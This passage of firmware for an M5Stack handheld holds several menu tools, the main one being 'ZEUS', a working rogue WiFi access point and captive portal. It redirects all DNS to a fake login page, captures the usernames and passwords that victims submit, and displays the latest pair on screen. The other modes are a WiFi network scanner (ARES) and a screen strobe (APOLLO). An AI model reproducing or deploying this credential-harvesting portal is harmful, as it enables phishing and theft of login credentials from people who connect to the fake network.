  zeusServer.on("/",HTTP_GET,[](){ zeusServer.send_P(200,"text/html",ZEUS_LOGIN_PAGE); });
  zeusServer.on("/login",HTTP_POST,[](){
    String u=zeusServer.arg("u"),p=zeusServer.arg("p");
    if(zeusCredCount<20){ strncpy(zeusCreds[zeusCredCount].user,u.c_str(),63); strncpy(zeusCreds[zeusCredCount].pass,p.c_str(),63); zeusCredCount++; }
    zeusServer.send_P(200,"text/html",ZEUS_SUCCESS_PAGE);
  });
  zeusServer.onNotFound([](){
    zeusServer.sendHeader("Location","http://192.168.4.1/",true);
    zeusServer.send(302,"text/plain","");
  });
  zeusServer.begin(); zeusRunning=true; bip_confirm();
}

void zeus_stop(){ zeusServer.stop(); dnsServer.stop(); WiFi.softAPdisconnect(true); WiFi.mode(WIFI_OFF); zeusRunning=false; }

void draw_Zeus(){
  canvas.fillScreen(COL_BG);
  bool fl=(millis()/500)%2==0;
  canvas.setTextSize(1); canvas.setTextColor(COL_CYAN);
  canvas.setCursor(2,4); canvas.print("** ZEUS **");
  canvas.setTextColor(fl?COL_CYAN:COL_CYAN_DIM);
  canvas.setCursor(W-30,4); canvas.print(zeusRunning?"ON":"OFF");
  canvas.drawLine(0,13,W,13,COL_CYAN_DIM);
  if(zeusRunning){
    dnsServer.processNextRequest(); zeusServer.handleClient();
    canvas.setTextColor(COL_CYAN_DIM); canvas.setCursor(2,20); canvas.print("SSID:");
    canvas.setTextColor(COL_CYAN); canvas.setCursor(2,30); canvas.print(zeusSSID);
    canvas.setTextColor(COL_CYAN_DIM); canvas.setCursor(2,44); canvas.print("IP: 192.168.4.1");
    int clients=WiFi.softAPgetStationNum();
    char cbuf[24]; snprintf(cbuf,sizeof(cbuf),"CLIENTS: %d",clients);
    canvas.setTextColor(clients>0?COL_CYAN:COL_CYAN_DIM); canvas.setCursor(2,54); canvas.print(cbuf);
    char credbuf[28]; snprintf(credbuf,sizeof(credbuf),"CAPTURED: %d",zeusCredCount);
    canvas.setTextColor(zeusCredCount>0?COL_CYAN:COL_CYAN_DIM); canvas.setCursor(2,68); canvas.print(credbuf);
    if(zeusCredCount>0){
      canvas.drawLine(0,80,W,80,COL_CYAN_DIM);
      canvas.setTextColor(COL_CYAN_DIM); canvas.setCursor(2,84); canvas.print("LAST CAPTURE:");
      int last=zeusCredCount-1;
      char ubuf[24]; snprintf(ubuf,sizeof(ubuf),"U: %.20s",zeusCreds[last].user);
      canvas.setTextColor(COL_CYAN); canvas.setCursor(2,94); canvas.print(ubuf);
      char pbuf[24]; snprintf(pbuf,sizeof(pbuf),"P: %.20s",zeusCreds[last].pass);
      canvas.setCursor(2,104); canvas.print(pbuf);
    }
  } else {
    canvas.setTextColor(COL_CYAN_DIM); canvas.setCursor(2,30); canvas.print("SSID:");
    canvas.setTextColor(COL_CYAN); canvas.setCursor(2,40); canvas.print(zeusSSID);
    canvas.setTextColor(COL_CYAN_DIM); canvas.setCursor(2,60); canvas.print("[A] START AP");
  }
  canvas.drawLine(0,H-14,W,H-14,COL_CYAN_DIM);
  canvas.setTextColor(COL_CYAN_DIM); canvas.setCursor(2,H-9);
  canvas.print(zeusRunning?"[A]STOP  [B]BACK":"[B] BACK");
}

void zeus_btnA(){ if(zeusRunning) zeus_stop(); else zeus_start(); }
void zeus_btnB(){ if(zeusRunning) zeus_stop(); currentMode=M_MENU; bip_back(); }

// ── ARES ──────────────────────────────────────────────
void ares_scan(){
  aresScanning=true; WiFi.mode(WIFI_STA);
  int n=WiFi.scanNetworks(false,true); aresCount=min(n,20);
  for(int i=0;i<aresCount;i++){
    strncpy(aresNets[i].ssid,WiFi.SSID(i).c_str(),32); aresNets[i].ssid[32]='\0';
    aresNets[i].rssi=WiFi.RSSI(i); aresNets[i].enc=WiFi.encryptionType(i);
    aresNets[i].channel=WiFi.channel(i);
    strncpy(aresNets[i].bssid,WiFi.BSSIDstr(i).c_str(),17); aresNets[i].bssid[17]='\0';
  }
  WiFi.scanDelete(); aresScanning=false;
}

void draw_Ares(){
  canvas.fillScreen(COL_BG);
  canvas.setTextSize(1); canvas.setTextColor(COL_CYAN);
  canvas.setCursor(2,4); canvas.print("** ARES **");
  char cbuf[20]; snprintf(cbuf,sizeof(cbuf),"NETS:%d",aresCount);
  canvas.setTextColor(COL_CYAN_DIM); canvas.setCursor(W-strlen(cbuf)*6-2,4); canvas.print(cbuf);
  canvas.drawLine(0,13,W,13,COL_CYAN_DIM);
  if(aresScanning){
    canvas.setTextColor(COL_CYAN_MID); canvas.setCursor(W/2-36,H/2-4); canvas.print("SCANNING...");
  } else if(aresCount==0){
    canvas.setTextColor(COL_CYAN_DIM); canvas.setCursor(2,30); canvas.print("NO NETWORKS FOUND");
    canvas.setCursor(2,44); canvas.print("[A] SCAN");
  } else {
    int idx=aresScroll%aresCount;
    WifiNet& net=aresNets[idx];
    canvas.setTextColor(COL_CYAN); canvas.setCursor(2,20);
    char ssidLine[24]; snprintf(ssidLine,sizeof(ssidLine),"%.22s",net.ssid);
    canvas.print(ssidLine);
    canvas.setTextColor(COL_CYAN_DIM); canvas.setCursor(2,34); canvas.print("SEC:");
    const char* encName;
    switch(net.enc){
      case WIFI_AUTH_OPEN:          encName="OPEN";      break;
      case WIFI_AUTH_WEP:           encName="WEP";       break;
      case WIFI_AUTH_WPA_PSK:       encName="WPA";       break;
      case WIFI_AUTH_WPA2_PSK:      encName="WPA2";      break;
      case WIFI_AUTH_WPA_WPA2_PSK:  encName="WPA/WPA2";  break;
      case WIFI_AUTH_WPA3_PSK:      encName="WPA3";      break;
      case WIFI_AUTH_WPA2_WPA3_PSK: encName="WPA2/WPA3"; break;
      default:                      encName="UNKNOWN";   break;
    }
    canvas.setTextColor(net.enc==WIFI_AUTH_OPEN?COL_CYAN:COL_CYAN_MID);
    canvas.setCursor(30,34); canvas.print(encName);
    canvas.setTextColor(COL_CYAN_DIM); canvas.setCursor(2,48); canvas.print("MAC:");
    canvas.setTextColor(COL_CYAN_MID); canvas.setCursor(30,48); canvas.print(net.bssid);
    canvas.setTextColor(COL_CYAN_DIM); canvas.setCursor(2,62); canvas.print("CH:");
    char chbuf[8]; snprintf(chbuf,sizeof(chbuf),"%d",net.channel);
    canvas.setTextColor(COL_CYAN); canvas.setCursor(20,62); canvas.print(chbuf);
    canvas.setTextColor(COL_CYAN_DIM); canvas.setCursor(50,62); canvas.print("FREQ:");
    canvas.setTextColor(COL_CYAN_MID); canvas.setCursor(86,62);
    canvas.print(net.channel<=14?"2.4GHz":"5GHz");
    canvas.setTextColor(COL_CYAN_DIM); canvas.setCursor(2,76); canvas.print("RSSI:");
    char rssiStr[12]; snprintf(rssiStr,sizeof(rssiStr),"%ddBm",net.rssi);
    uint16_t rssiCol=net.rssi>-60?COL_CYAN:net.rssi>-75?COL_CYAN_MID:COL_CYAN_DIM;
    canvas.setTextColor(rssiCol); canvas.setCursor(36,76); canvas.print(rssiStr);
    int bars=map(constrain(net.rssi,-90,-40),-90,-40,0,5);
    for(int b=0;b<5;b++) canvas.fillRect(90+b*8,74,6,8,b<bars?rssiCol:(uint16_t)COL_CYAN_DIM);
    canvas.setTextColor(COL_CYAN_DIM);
    char counter[16]; snprintf(counter,sizeof(counter),"[%d/%d]",idx+1,aresCount);
    canvas.setCursor(W-strlen(counter)*6-2,76); canvas.print(counter);
  }
  canvas.drawLine(0,H-14,W,H-14,COL_CYAN_DIM);
  canvas.setTextColor(COL_CYAN_DIM); canvas.setCursor(2,H-9);
  canvas.print(aresCount>0?"[A]NEXT [B]BACK":"[A]SCAN  [B]BACK");
}

void ares_btnA(){ if(aresCount==0) ares_scan(); else aresScroll=(aresScroll+1)%aresCount; }
void ares_btnB(){ WiFi.mode(WIFI_OFF); currentMode=M_MENU; bip_back(); }

// ── APOLLO ────────────────────────────────────────────
void draw_Apollo(){
  if(apolloRunning){
    if(millis()-apolloLastFlash>(unsigned long)apolloSpeed){ apolloLastFlash=millis(); apolloFlash=!apolloFlash; }
    canvas.fillScreen(apolloFlash?COL_WHITE:COL_BG);
    canvas.setTextSize(1); canvas.setTextColor(apolloFlash?COL_BG:COL_CYAN_DIM);
    char spd[20]; snprintf(spd,sizeof(spd),"%dms",apolloSpeed);
    canvas.setCursor(2,4); canvas.print(spd);
    canvas.setCursor(W-42,4); canvas.print("[B]STOP");
    canvas.setCursor(2,H-9); canvas.print("[A]SPEED");
  } else {
    canvas.fillScreen(COL_BG);
    canvas.setTextSize(1); canvas.setTextColor(COL_CYAN);
    canvas.setCursor(2,4); canvas.print("** APOLLO **");
    canvas.drawLine(0,13,W,13,COL_CYAN_DIM);
    canvas.setTextColor(COL_CYAN_DIM); canvas.setCursor(2,30); canvas.print("STROBE DISPLAY");
    char spd[24]; snprintf(spd,sizeof(spd),"SPEED: %dms",apolloSpeed);
    canvas.setCursor(2,44); canvas.print(spd);
    canvas.drawLine(0,H-14,W,H-14,COL_CYAN_DIM);
    canvas.setCursor(2,H-9); canvas.print("[A]START  [B]BACK");
  }
}

void apollo_btnA(){
  if(apolloRunning){
    if(apolloSpeed==200) apolloSpeed=100;
    else if(apolloSpeed==100) apolloSpeed=50;
    else if(apolloSpeed==50)  apolloSpeed=30;
    else apolloSpeed=200;
    bip_select();
  } else { apolloRunning=true; apolloLastFlash=millis(); bip_confirm(); }
}
void apollo_btnB(){
  if(apolloRunning){ apolloRunning=false; bip_back(); }
  else { currentMode=M_MENU; bip_back(); }
}

// ── SETUP & LOOP ──────────────────────────────────────
void setup(){
  Serial.begin(115200);
  auto cfg=M5.config(); M5.begin(cfg);
  M5.Speaker.begin(); M5.Speaker.setVolume(200);
  M5.Display.setRotation(1); M5.Display.setBrightness(210); M5.Display.fillScreen(0);
  W=M5.Display.width(); H=M5.Display.height();
  canvas.setColorDepth(16); canvas.createSprite(W,H);
  canvas.setTextFont(1); canvas.setTextSize(1);

  if(SPIFFS.begin(false))
    spiffsOK=SPIFFS.exists("/index_message_1.wav")&&SPIFFS.exists("/index_message_2.wav");

  // Inicializa IR e liga alimentação do LED IR
  ir_setup();
  M5.Power.setExtOutput(true, m5::ext_none);
  delay(100);

  randomSeed(analogRead(0)^millis());
  strncpy(currentSender,"THE INDEX",31);
  hermes_connect();
  hermes_setupServer();
  Serial.println("[BOOT] Pronto!");
}

void loop(){
  M5.update();
  if(M5.BtnA.wasPressed()){
    if(currentMode==M_MENU){ menuIdx=(menuIdx+1)%MENU_COUNT; bip_select(); }
    else if(currentMode==M_HERMES){ btnAHolding=true; btnAHoldStart=millis(); }
    else if(currentMode==M_HADES)  hades_btnA();
    else if(currentMode==M_ZEUS)   zeus_btnA();
    else if(currentMode==M_ARES)   ares_btnA();
    else if(currentMode==M_APOLLO) apollo_btnA();
  }
  if(M5.BtnA.wasReleased()&&currentMode==M_HERMES){
    unsigned long held=millis()-btnAHoldStart; btnAHolding=false;
    if(held>=HOLD_CLEAR_MS) hermes_btnA_hold(); else hermes_btnA();
  }
  if(btnAHolding&&currentMode==M_HERMES&&millis()-btnAHoldStart>=HOLD_CLEAR_MS){
    btnAHolding=false; hermes_btnA_hold();
  }
  if(M5.BtnB.wasPressed()){
    if(currentMode==M_MENU){
      bip_confirm();
      switch(menuIdx){
        case 0: currentMode=M_HERMES; hermes_changeState(HS_IDLE); break;
        case 1: currentMode=M_HADES;  hadesRunning=false; break;
        case 2: currentMode=M_ZEUS;   zeusRunning=false;  break;
        case 3: currentMode=M_ARES;   aresCount=0;        break;
        case 4: currentMode=M_APOLLO; apolloRunning=false;break;
      }
    }
    else if(currentMode==M_HERMES) hermes_btnB();
    else if(currentMode==M_HADES)  hades_btnB();
    else if(currentMode==M_ZEUS)   zeus_btnB();
    else if(currentMode==M_ARES)   ares_btnB();
    else if(currentMode==M_APOLLO) apollo_btnB();
  }
  canvas.fillScreen(COL_BG);
  switch(currentMode){
    case M_MENU:   draw_Menu();   break;
    case M_HERMES: draw_Hermes(); break;
    case M_HADES:  draw_Hades();  break;
    case M_ZEUS:   draw_Zeus();   break;
    case M_ARES:   draw_Ares();   break;
    case M_APOLLO: draw_Apollo(); break;
  }
  canvas.pushSprite(0,0);
  delay(16);
}